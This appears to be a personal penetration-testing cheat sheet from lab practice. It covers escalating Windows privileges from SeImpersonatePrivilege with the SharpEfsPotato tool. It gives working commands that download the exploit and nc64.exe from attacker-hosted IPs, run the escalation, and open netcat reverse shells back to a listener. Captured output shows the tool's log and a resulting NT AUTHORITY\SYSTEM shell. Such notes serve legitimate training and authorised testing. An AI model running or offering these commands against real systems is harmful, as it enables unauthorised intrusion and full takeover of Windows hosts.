
https://docs.particle42.com/windows/windows-pe/seimpersonateprivilege
https://github.com/jakobfriedl/precompiled-binaries?tab=readme-ov-file
Located in binaries my kali
SharpEfsPotato.exe

## Elevated powershell
Get the binary
```
iwr -uri http://192.168.49.146/SharpEfsPotato.exe -Outfile SharpEfsPotato.exe
```

Getting a elevated powershell
```
PS C:\temp> .\SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
.\SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/bcb98407-3619-48c4-aaed-20ac69dc2676/\bcb98407-3619-48c4-aaed-20ac69dc2676\bcb98407-3619-48c4-aaed-20ac69dc2676
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
PS C:\temp> whoami
whoami
oscp\lisa
```

## Generating a reverse shell 

### Prepare reverse shell using netcat

```
iwr -uri http://192.168.45.175/nc64.exe -OutFile nc64.exe
```

Listen
```
ncat -nvlp 445 
```

```
.\SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.49.146 445 | Set-Content C:\temp\w.log"
```

If powershell version is unknown, let's use CMD
```
.\SharpEfsPotato.exe -p "C:\Windows\system32\cmd.exe" -a "/c C:\temp\nc64.exe 192.168.49.146 445 -e cmd.exe"
```

```
└─$ ncat -nvlp 445
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:445
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 192.168.146.101:52659.
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```